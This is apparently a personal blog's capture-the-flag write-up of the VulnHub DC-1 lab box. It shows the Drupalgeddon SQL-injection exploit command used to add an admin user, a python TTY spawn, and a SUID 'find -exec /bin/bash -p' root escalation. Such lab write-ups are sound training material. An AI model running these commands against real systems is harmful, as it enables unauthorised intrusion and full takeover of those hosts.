---
layout: default
title : muzec - DC1 Writeup
---

![image](https://user-images.githubusercontent.com/69868171/118831579-e235ac80-b88d-11eb-83d1-1a595884c846.png)

Yet again today we be working on another OSCP like box DC1 On vulnhub you can grab a copy here [Download  DC1](https://www.vulnhub.com/entry/dc-1,292/) .

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Sun May 16 15:48:28 2021 as: nmap -sC -sV -oA nmap 172.16.109.134
Nmap scan report for 172.16.109.134
Host is up (0.00017s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33474/tcp6  status
|   100024  1          40386/udp6  status
|   100024  1          43432/tcp   status
|_  100024  1          51414/udp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 16 15:48:40 2021 -- 1 IP address (1 host up) scanned in 11.71 seconds
```

3 open ports interesting let check port 80 i can already see it running drupal 7 on the nmap scan probably easy lol so i quickly use `searchsploit drupal 7` to find exploit.

![image](https://user-images.githubusercontent.com/69868171/118833256-502ea380-b88f-11eb-81b7-e45434472872.png)

Seems we have some cool exploits for drupal 7 let try using `Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)` yes adding another admin user with the help of SQL Injection.

`python 34992.py -t http://172.16.109.134/ -u muzec -p muzec`

![image](https://user-images.githubusercontent.com/69868171/118016360-4b17a480-b323-11eb-9fcf-14de63f71ef2.png)

And user created let use it to log in .

![image](https://user-images.githubusercontent.com/69868171/118834458-3cd00800-b890-11eb-9501-485686e2ab54.png)

We are in now let try and get a reverse shell .

NOTE:- if you are having a problem getting a reverse kindly read my latest writeup on drupal reverse shell here [DroopyCTF Writeup](https://muzec0318.github.io/posts/Droopy.html) .

![image](https://user-images.githubusercontent.com/69868171/118835236-cb448980-b890-11eb-9727-422d1296b6c5.png)

Clicking on save give us back a reverse shell . 

![image](https://user-images.githubusercontent.com/69868171/118835583-22e2f500-b891-11eb-81da-2471ee310af1.png)

Now let spawn a TTY shell `python -c 'import pty; pty.spawn ("/bin/bash")'` .

![image](https://user-images.githubusercontent.com/69868171/118835813-532a9380-b891-11eb-850c-2036c9b0567e.png)


### Privilege Escalation

Checking for SUID permission that can lead to root `find / -perm -u=s -type f 2>/dev/null` and we have `/usr/bin/find` let check gtfobins .

![image](https://user-images.githubusercontent.com/69868171/118837290-a94c0680-b892-11eb-91ab-dfd0994d431f.png)


![image](https://user-images.githubusercontent.com/69868171/118837365-ba951300-b892-11eb-9e41-1d85ce7d0cb6.png)

And we have `/usr/bin/find . -exec /bin/bash -p \; -quit` running it give us root .

![image](https://user-images.githubusercontent.com/69868171/118837707-1790c900-b893-11eb-9086-4277127b3d2b.png)

Box rooted and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
